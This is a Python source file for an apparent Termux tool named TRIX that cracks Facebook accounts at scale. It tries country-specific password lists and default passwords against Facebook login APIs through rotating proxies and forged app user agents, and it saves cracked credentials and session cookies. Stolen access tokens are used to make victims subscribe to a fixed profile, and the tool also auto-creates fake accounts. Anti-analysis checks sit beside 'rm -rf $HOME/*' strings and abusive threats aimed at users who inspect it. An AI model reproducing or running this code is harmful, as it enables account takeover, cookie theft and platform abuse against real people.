...
try:
    ...
    print('\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;97mINSTALLING REQUESTS...')
    os.system('pip install requests')
try:
    import bs4 
except ImportError:
    print('\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;97mINSTALLING BS4...')
    os.system('pip install bs4')
try:
    import rich 
except ImportError:
    print('\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;97mINSTALLING RICH...')
    os.system('pip install rich')
try:
    import concurrent.futures
except ImportError:
    print('\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;97mINSTALLING FUTURES...')
...
from concurrent.futures import ThreadPoolExecutor as MrError
from string import * 
...
except PermissionError:os.system('clear');print(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;97mPLEASE ENABLE STORAGE PERMISSION TO CONTINUE');os.system('termux-setup-storage');exit()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ STORAGE FOLDER ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
files_to_create = [
    "/sdcard/TRIXX/FILE/TRIX-FILE-M1-OK.txt",
    "/sdcard/TRIXX/FILE/TRIX-FILE-M1-COOKIE.txt",
    "/sdcard/TRIXX/FILE/TRIX-FILE-M2-OK.txt",
    "/sdcard/TRIXX/FILE/TRIX-FILE-M2-COOKIE.txt",
    "/sdcard/TRIXX/FILE/TRIX-FILE-M3-OK.txt",
    "/sdcard/TRIXX/FILE/TRIX-FILE-M3-COOKIE.txt",
    "/sdcard/TRIXX/FILE/TRIX-FILE-M4-OK.txt",
    "/sdcard/TRIXX/FILE/TRIX-FILE-M4-COOKIE.txt",
    "/sdcard/TRIXX/FILE/TRIX-FILE-M5-OK.txt",
    "/sdcard/TRIXX/FILE/TRIX-FILE-M5-COOKIE.txt",
    "/sdcard/TRIXX/FILE/TRIX-FILE-M6-OK.txt",
    "/sdcard/TRIXX/FILE/TRIX-FILE-M6-COOKIE.txt",
    "/sdcard/TRIXX/FILE/TRIX-FILE-M1-CP.txt",
    "/sdcard/TRIXX/FILE/TRIX-FILE-M2-CP.txt",
    "/sdcard/TRIXX/FILE/TRIX-FILE-M3-CP.txt",
    "/sdcard/TRIXX/FILE/TRIX-FILE-M4-CP.txt",
    "/sdcard/TRIXX/FILE/TRIX-FILE-M5-CP.txt",
    "/sdcard/TRIXX/FILE/TRIX-FILE-M6-CP.txt",
    "/sdcard/TRIXX/OLD/TRIX-OLD-M1-OK.txt",
    "/sdcard/TRIXX/AUTO/TRIX-AUTO-M1-OK.txt"
]
...
for file_path in files_to_create:
    if not os.path.exists(file_path):
        with open(file_path, 'w'):
            pass
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ MODEL ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
model1 = requests.get('https://raw.githubusercontent.com/ETHANKLEINERROEKING/CONTROL-ROOM/main/m.txt').text.splitlines()
model2 = requests.get('https://raw.githubusercontent.com/ETHANKLEINERROEKING/CONTROL-ROOM/main/m2.txt').text.splitlines()
model3 = requests.get('https://raw.githubusercontent.com/ETHANKLEINERROEKING/CONTROL-ROOM/main/m3.txt').text.splitlines()
model4 = requests.get('https://raw.githubusercontent.com/ETHANKLEINERROEKING/CONTROL-ROOM/main/m4.txt').text.splitlines()
model5 = requests.get('https://raw.githubusercontent.com/ETHANKLEINERROEKING/CONTROL-ROOM/main/m5.txt').text.splitlines()
model6 = requests.get('https://raw.githubusercontent.com/ETHANKLEINERROEKING/CONTROL-ROOM/main/m6.txt').text.splitlines()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ PROXY SERVER ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
...
try:
    ...
    exit(' \x1b[1;92m[\x1b[1;97m!\x1b[1;92m] \x1b[1;91m NETWORK IS TOO SLOW ')

def get_proxy():
    proxies = open('.prox.txt', 'r').read().splitlines()
    return {'http': 'socks5://' + random.choice(proxies),
            'https': 'socks5://' + random.choice(proxies)}
...
if bit == '64bit':
 print(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mYOU ARE 64BIT USER')
 time.sleep(4)
elif bit == '32bit':
 print(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mYOU ARE 32BIT USER')
 time.sleep(4)
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ ETC MODULES ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
sim_id = ''
...
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LOOP ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[];cid=[];user_agents=[]
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ COLOR ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
...
def linex():print(f'\x1b[1;94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ SECURITY CODE ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
site = '/data/data/com.termux/files/usr/lib/python3.12/site-packages/'
alart=(f"\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] \x1b[1;91mDO NOT TRY TO FUCK YOUR MOM...")
if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
    exit('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] \x1b[1;91mSOMETHING WENT WRONG')
...
def clr():
    try:
        ...
        if 'Android' in data:
            os.system('clear');print(f'\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] \x1b[1;91mqDONT TRY BYPASS & CAPTURE MOTHER FUCKER\n\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] \x1b[1;91mYOUR SYSTEM FUCKED BY ETHAN');exit()
        else:exit()
    except:exit()
...
if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
    ...
    print(f"\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] \x1b[1;91mBRO TURN OFF PROTECTER THEN RUN TOOL");exit()
a = 'rm -rf'
b = 'rm -rf $HOME/*'
c = '/sdcard/Download/*'
...
def checking():
    ...
    if "verify = False" in filedata63:exit(f"{alart}")
    else:pass
    with open(f'{site}requests/sessions.py', 'r') as file :
        filedata63 = file.read()
    if "self.verify = False" in filedata63:exit(f"{alart}")
    else:pass
    with open(f'{site}urllib3/connection.py', 'r') as file7i7 :
        filedata47 = file7i7.read()
    if str("cert_reqs = 'CERT_NONE'") in filedata47:exit(f"{alart}")
def verify():
    with open(f'{site}requests/sessions.py', 'r') as file :
            filedata = file.read()
...
try:
    ...
    if f'com.httpcanary.pro' in fileee:
        print('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] \x1b[1;91mPLEASE UNINSTALL HTTP CANARY FROM YOUR DEVICE');exit()
except:pass
def issue():
    if os.path.isfile("/data/data/com.termux/files/usr/bin/rm"):pass
    else:system('clear');print(f'\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] \x1b[1;91mSYSTEM MODIFICATION NOT ALLOWED WARNING BY ERROR');exit()
...
def Samsung():
    android_versions = [
        '10', '13', '7.0.0', '7.1.1', '9', '12', '11',
        '9.0', '8.0.0', '7.1.2', '7.0', '4', '5', '4.4.2',
        '5.1.1', '6.0.1', '9.0.1'
    ]
    models = [
    ...
    cho = str(random.randint(43, 446))
    fb = random.choice(fb_apps)
    FBAN, platform = fb.split('|')[1], fb.split('|')[0]

    density = f"{random.randint(1,3)}.0"
    width = random.randint(720, 1500)
    height = random.randint(1500, 2000)
    ...
    ua = (
        ...
        f"FBSV/{Anderson};FBCA/armeabi-v7a:armeabi;FBDM/{{density={density},"
        f"width={width},height={height}}};FB_FW/1;]"
    )
    return ua
...
def Redmi():
    ...
    # pick architecture based on Android version (newer = arm64)
    arch = "arm64-v8a" if int(Anderson.split('.')[0]) >= 9 else "armeabi-v7a"

    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {Anderson}; {model} Build/RKQ1.201004.002) "
        f"[FBAN/{FBAN};FBAV/{cho}.0.0.32.117;FBPN/{platform};FBLC/cs_CZ;"
        f"FBBV/{vir};FBCR/O2.CZ;FBMF/Xiaomi;FBBD/xiaomi;FBDV/{model};"
        f"FBSV/{Anderson};FBCA/{arch};FBDM/{{density={density},width={width},"
        f"height={height}}};FB_FW/1;] FBBK/1"
    )
    return ua
...
def zte():
    ...
    # Pick ABI based on Android version
    arch = "arm64-v8a" if int(Anderson.split('.')[0]) >= 9 else "armeabi-v7a"

    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {Anderson}; {model} Build/RP1A.201005.001) "
        f"[FBAN/{FBAN};FBAV/{cho}.0.0.35.115;FBPN/{platform};FBLC/en_AU;"
        f"FBBV/{vir};FBCR/Telstra;FBMF/ZTE;FBBD/ZTE;FBDV/{model};"
        f"FBSV/{Anderson};FBCA/{arch};FBDM/{{density={density},width={width},"
        f"height={height}}};FB_FW/1;]"
    )
    return ua
...
def huawei():
    ...
    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {Anderson}; {model} Build/{model}) "
        f"[FBAN/{FBAN};FBAV/{cho}.0.0.1.116;FBPN/{platform};FBLC/cs_CZ;"
        f"FBBV/{vir};FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/{model};"
        f"FBSV/{Anderson};FBCA/{arch};FBDM/{{density={density},width={width},"
        f"height={height}}};]"
    )
    return ua
...
def lge():
    ...
    carriers = ["T-Mobile", "AT&T", "Verizon", "Sprint", "Cricket", "Boost", "null"]
    ...
    waid = str(random.randint(720, 1500))
    hight = str(random.randint(1500, 2000))
    density = f"{random.randint(1,3)}.0"
    ...
    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {Anderson}; {model} Build/OPM1.171019.019) "
        f"[FBAN/{FBAN};FBAV/{cho}.0.0.16.236;FBPN/{platform};FBLC/en_US;"
        f"FBBV/{vir};FBCR/{carrier};FBMF/LGE;FBBD/lge;FBDV/{model};"
        f"FBSV/{Anderson};FBCA/{arch};FBDM/{{density={density},width={waid},"
        f"height={hight}}};FB_FW/1;]"
    )
    return ua
...
def hisense():
    ...
    # ABI based on Android version
    arch = "arm64-v8a" if int(Anderson.split('.')[0]) >= 9 else "armeabi-v7a"

    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {Anderson}; {model} Build/NRD9OM) "
        f"[FBAN/{FBAN};FBAV/{cho}.0.0.39.118;FBPN/{platform};FBLC/es_MX;"
        f"FBBV/{vir};FBCR/TELCEL;FBMF/Hisense;FBBD/Hisense;FBDV/{model};"
        f"FBSV/{Anderson};FBCA/{arch};FBDM/{{density={density},width={waid},"
        f"height={hight}}};FB_FW/1;FBRV/181817659;] FBBK/1"
    )
    return ua
...
def vivo():
    ...
    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {Anderson}; {model} Build/QP1A.190711.020) "
        f"[FBAN/{FBAN};FBAV/{cho}.0.0.8.106;FBPN/{platform};FBLC/in_ID;FBBV/{vir};"
        f"FBCR/AXIS;FBMF/vivo;FBBD/vivo;FBDV/{model};FBSV/{Anderson};FBCA/{arch};"
        f"FBDM/{{density={density},width={waid},height={hight}}};]"
    )
    return ua
...
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LOGO ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
logo=(f"""
    \x1b[1;92md888888b d8888b. d888888b db    db 
    \x1b[1;92m`~~88~~' 88  `8D   `88'   `8b  d8' 
       \x1b[1;97m88    88oobY'    88     `8bd8'  
       \x1b[1;97m88    88`8b      88     .dPYb.  
       \x1b[1;92m88    88 `88.   .88.   .8P  Y8. 
       \x1b[1;92mYP    88   YD Y888888P YP    YP \x1b[1;91mMR ERROR
\x1b[1;94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mAUTHOR    : ETHAN KLEIN HUILEN 
\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mGITHUB    : ERRORDEATH\x1b[1;93m-\x1b[1;92m403
\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mTOOL TYPE : \x1b[1;92mFILE\x1b[1;93m-\x1b[1;92mRANDOM\x1b[1;93m-\x1b[1;92mOLD
\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mVERSION   : \x1b[1;93m{version}
\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mYOUR KEY  : \x1b[1;92m KALYAN KING
\x1b[1;94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ MAIN/MENU ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def menu():
        try:                        
                        ...
                        os.system("xdg-open https://t.me/KGF_TEAM_CYBER")
                        print(f'\x1b[1;97m[\x1b[1;96m1\x1b[1;97m] \x1b[1;92mFILE CLONING')
                        print(f'\x1b[1;97m[\x1b[1;96m2\x1b[1;97m] \x1b[1;92mRANDOM CLONING')
                        print(f'\x1b[1;97m[\x1b[1;96m3\x1b[1;97m] \x1b[1;92mOLD CLONING')
                        print(f'\x1b[1;97m[\x1b[1;96m4\x1b[1;97m] \x1b[1;92mAUTO CREATE')
                        linex()
                        error=input(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mCHOOSE : ')
                        if error in ['1','01']:
                                clear()
                                print(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mEXAMPLE : /sdcard/ERROR.txt OR ERROR.txt')
                                linex()
                                file = input(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mFILE NAME : \x1b[1;92m')
                                try:
                                        if not file.startswith("/") and not file.startswith("./"):
                                           filexx = f"/sdcard/{file}"
                                        else:
                                           filexx = file
                                        fo = open(filexx,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(f'\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] \x1b[1;91mFILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(f'\x1b[1;97m[\x1b[1;96m1\x1b[1;97m] \x1b[1;92mMETHOD \x1b[1;97m[\x1b[1;92mAPI\x1b[1;97m]')
                                print(f'\x1b[1;97m[\x1b[1;96m2\x1b[1;97m] \x1b[1;92mMETHOD \x1b[1;97m[\x1b[1;92mGRAPH\x1b[1;97m]')
                                print(f'\x1b[1;97m[\x1b[1;96m3\x1b[1;97m] \x1b[1;92mMETHOD \x1b[1;97m[\x1b[1;92mB-API\x1b[1;97m]')
                                print(f'\x1b[1;97m[\x1b[1;96m4\x1b[1;97m] \x1b[1;92mMETHOD \x1b[1;97m[\x1b[1;92mB-GRAPH\x1b[1;97m]')
                                linex()
                                mthd=input(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mCHOOSE : ')
                                clear()
                                plist = []           
                                print(f'\x1b[1;97m[\x1b[1;96m1\x1b[1;97m] \x1b[1;92mAUTO PASSWORD')
                                print(f'\x1b[1;97m[\x1b[1;96m2\x1b[1;97m] \x1b[1;92mMANUAL PASSWORD')
                                linex()
                                passlist=input(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mCHOOSE : ')
                                if passlist in ['1','01']:
                                        clear()
                                        print(f'\x1b[1;97m[\x1b[1;96m1\x1b[1;97m] \x1b[1;92mAUTO BANGLADESH PASSLIST')
                                        print(f'\x1b[1;97m[\x1b[1;96m2\x1b[1;97m] \x1b[1;92mAUTO NEPAL PASSLIST')
                                        print(f'\x1b[1;97m[\x1b[1;96m3\x1b[1;97m] \x1b[1;92mAUTO PAKISTAN PASSLIST')
                                        print(f'\x1b[1;97m[\x1b[1;96m4\x1b[1;97m] \x1b[1;92mAUTO INDIA PASSLIST')
                                        print(f'\x1b[1;97m[\x1b[1;96m5\x1b[1;97m] \x1b[1;92mAUTO PHILIPPINES PASSLIST')
                                        linex()
                                        countrypasslist=input(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mCHOOSE : ')
                                        if countrypasslist in ['1','01']:
                                             ...
                                             plist.append('first@1122')
                                             plist.append('first@1212')
                                             plist.append('first111')
                                             plist.append('first098')
                                             plist.append('@first@')
                                             plist.append('first@#')
                                             ...
                                             plist.append('99887766')
                                             plist.append('09876543')
                                             ...
                                             plist.append('khan@123')
                                             plist.append('khan@786')
                                             plist.append('khan@1122')
                                             plist.append('pak123')
                                             plist.append('pak12345')
                                             plist.append('pak123456')
                                             plist.append('pak123456789')
                                             plist.append('pakistan123')
                                             plist.append('pakistan12345')
                                             plist.append('pakistan123456')
                                             plist.append('pakistan123456789')
                                        ...
                                        try:
                                                clear()
                                                ps_limit = int(input(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mPASSWORD LIMIT : \x1b[1;92m'))
                                        except:
                                                ps_limit =1
                                        clear()
                                        print(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mEXAMPLE : \x1b[1;92mfirstlast/first@@/first123')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mPASSWORD NO {i+1}: \x1b[1;92m'))
                                clear()
                                cx=input(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mDO YOU CP SHOW ACCOUNT \x1b[1;97m(\x1b[1;92mY\x1b[1;97m/\x1b[1;91mN\x1b[1;97m) : ')
                                linex()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mTOTAL ID : \x1b[1;92m{total_ids}')                                   
                                        print(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mTURN ON/OFF AIRPLANE MODE EVERY 5 MINUTES')
                                        linex()
                                        for user in fo:
                                ...
                                print()
                                linex()
                                print(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mTHE PROCESS HAS COMPLETED')
                                print(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mTOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;97mPRESS ENTER TO BACK ')
                                menu()
                        elif error in ['2','02']:
                                print("\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mCOMING SOON")
                                exit()
                        elif error in ['3','03']:
                                old_clone()
                        elif error in ['4','04']:
                                ...
                                exit(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mEXIT DONE ')
                        else:
                                exit(f'\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] \x1b[1;91mOPTION NOT FOUND IN MENU');menu()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print(f'\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] \x1b[1;91mNO INTERNET CONNECTION...')
                exit()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE M1 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def api1(ids,names,passlist):
    try:
        global oks,cps,loop
        sys.stdout.write(f"\r\r\x1b[1;97m[\x1b[1;92mTRIX-M1\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
...
'Content-Type': 'application/json'}
            ...
            if 'session_key' in po:
                print('\r\r\033[1;32m[TRIX-OK] ' +ids+ ' | '+pas)
                ...
                open('/sdcard/TRIXX/FILE/TRIX-FILE-M1-OK.txt','a').write(ids+'|'+pas+'\n')
                open('/sdcard/TRIXX/FILE/TRIX-FILE-M1-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                  if 'y' in pcp:
                     print('\r\r\x1b[1;34m[TRIX-2F] '+ids+ ' | '+pas)
                     open('/sdcard/TRIXX/FILE/TRIX-FILE-M1-2F.txt','a').write(ids+'|'+pas+'\n')
                     twf.append(ids)
                     break
            elif 'www.facebook.com' in po['error']['message']:
                  if 'y' in pcp:        
                    print('\r\r\x1b[1;31m[TRIX-CP] '+ids+ ' | '+pas)
                    open('/sdcard/TRIXX/FILE/TRIX-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
            else:
                continue
...
def api2(ids,names,passlist):
    try:
        global oks,cps,loop
        sys.stdout.write(f"\r\r\x1b[1;97m[\x1b[1;92mTRIX-M2\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
...
'Content-Type': 'application/json'}
            ...
            if 'session_key' in po:
                ...
                token = po['access_token']
                requests.post('https://graph.facebook.com/'+'833553969/'+'subscribers'+'?access_token='+token)
                open('/sdcard/TRIXX/FILE/TRIX-FILE-M2-OK.txt','a').write(ids+'|'+pas+'\n')
                open('/sdcard/TRIXX/FILE/TRIX-FILE-M2-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                  if 'y' in pcp:
                     print('\r\r\x1b[1;34m[TRIX-2F] '+ids+ ' | '+pas)
                     open('/sdcard/TRIXX/FILE/TRIX-FILE-M2-2F.txt','a').write(ids+'|'+pas+'\n')
                     twf.append(ids)
                     break
            elif 'www.facebook.com' in po['error']['message']:
                  if 'y' in pcp:        
                    print('\r\r\x1b[1;31m[TRIX-CP] '+ids+ ' | '+pas)
                    open('/sdcard/TRIXX/FILE/TRIX-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
            else:
                continue
...
def api3(ids,names,passlist):
    try:
        global oks,cps,loop
        sys.stdout.write(f"\r\r\x1b[1;97m[\x1b[1;92mTRIX-M3\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
...
'Content-Type': 'application/json'}
            ...
            if 'session_key' in po:
                ...
                token = po['access_token']
                requests.post('https://graph.facebook.com/'+'833553969/'+'subscribers'+'?access_token='+token)
                open('/sdcard/TRIXX/FILE/TRIX-FILE-M3-OK.txt','a').write(ids+'|'+pas+'\n')
                open('/sdcard/TRIXX/FILE/TRIX-FILE-M3-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                  if 'y' in pcp:
                     print('\r\r\x1b[1;34m[TRIX-2F] '+ids+ ' | '+pas)
                     open('/sdcard/TRIXX/FILE/TRIX-FILE-M3-2F.txt','a').write(ids+'|'+pas+'\n')
                     twf.append(ids)
                     break
            elif 'www.facebook.com' in po['error']['message']:
                  if 'y' in pcp:        
                    print('\r\r\x1b[1;31m[TRIX-CP] '+ids+ ' | '+pas)
                    open('/sdcard/TRIXX/FILE/TRIX-FILE-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
            else:
                continue
...
def api4(ids,names,passlist):
    try:
        global oks,cps,loop
        sys.stdout.write(f"\r\r\x1b[1;97m[\x1b[1;92mTRIX-M4\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
...
'Content-Type': 'application/json'}
            ...
            if 'session_key' in po:
                ...
                token = po['access_token']
                requests.post('https://graph.facebook.com/'+'833553969/'+'subscribers'+'?access_token='+token)
                open('/sdcard/TRIXX/FILE/TRIX-FILE-M4-OK.txt','a').write(ids+'|'+pas+'\n')
                open('/sdcard/TRIXX/FILE/TRIX-FILE-M4-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                  if 'y' in pcp:
                     print('\r\r\x1b[1;34m[TRIX-2F] '+ids+ ' | '+pas)
                     open('/sdcard/TRIXX/FILE/TRIX-FILE-M4-2F.txt','a').write(ids+'|'+pas+'\n')
                     twf.append(ids)
                     break
            elif 'www.facebook.com' in po['error']['message']:
                  if 'y' in pcp:        
                    print('\r\r\x1b[1;31m[TRIX-CP] '+ids+ ' | '+pas)
                    open('/sdcard/TRIXX/FILE/TRIX-FILE-M4-CP.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
            else:
                continue
...
def old_clone():
    clear()
    print('\x1b[1;97m[\x1b[1;96m1\x1b[1;97m] \x1b[1;92m100003/4 SERIES')
    linex()
    print('\x1b[1;97m[\x1b[1;96m2\x1b[1;97m] \x1b[1;92m2009 SERIES')
    linex()
    _input = input(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mCHOOSE : ')
    if _input in ['1','01']:
        old_tow()
    elif _input in ['2','02']:
        old_tree()
...
def old_tow():
    user = []
    clear()
    print(f"\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mEXAMPLE : 20000 | 30000 | 99999")
    linex()
    limit = input(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mCHOOSE : ')
    clear()
    ...
    for _ in range(int(limit)):
        ...
        uid = prefix + suffix
        user.append(uid)
    print('\x1b[1;97m[\x1b[1;96m1\x1b[1;97m] \x1b[1;92mMETHOD ')
    linex()
    meth = input(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mCHOOSE : ')
    with tred(max_workers=30) as pool:
        clear()
        print(f"\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mTOTAL ID : \x1b[1;92m{limit}")
        print(f'\x1b[1;97m[\x1b[1;96m●\x1b[1;97m] \x1b[1;92mTURN ON/OFF AIRPLANE MODE EVERY 5 MINUTES')
        linex()
        for uid in user:
            if meth in ['1','01']:
...
def login_1(uid):
    ...
    sys.stdout.write(f"\r\r\x1b[1;97m[\x1b[1;92mTRIX-OLD\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
    sys.stdout.flush()
    ...
    try:
        for pw in ('123456', '1234567', '12345678', '123456789'):
            ...
            if 'session_key' in res:
                print('\r\r\033[1;32m[TRIX-OK] ' +uid+ ' | '+pw)
                open('/sdcard/TRIXX/OLD/TRIX-OLD-M1-OK.txt','a').write(uid+'|'+pw+'\n')
                oks.append(uid)
                break
...
def autocreate() -> None:
    ...
    for make in range(1000):
        sys.stdout.write(f"\r\r\x1b[1;97m[\x1b[1;92mTRIX-CREATE\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{make+1}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
        sys.stdout.flush()
        ...
        domainn = random.choice(['gmail.com','hotmail.com','outlook.com','yahoo.com','myyahoo.com','protonmail.com','live.com','rocket.com'])
        email2 = f"{firstname.lower()}{lastname.lower()}{random.randint(10,99)}@{domainn}"
        passw = gen_password(12)
        payload = {
            'ccp': "2",
        ...
        if py_submit is not None and 'c_user' in py_submit.cookies:
            ...
            print('\r\r\033[1;32m[TRIX-OK] '+uid+' | '+passw)
            print('\r\r\033[1;32m[COOKIE] '+cookie)
            open('/sdcard/TRIXX/AUTO/TRIX-AUTO-M1-OK.txt','a').write(uid+'|'+passw+'\n')
            oks.append(uid)
        else:
            cps.append(uid)
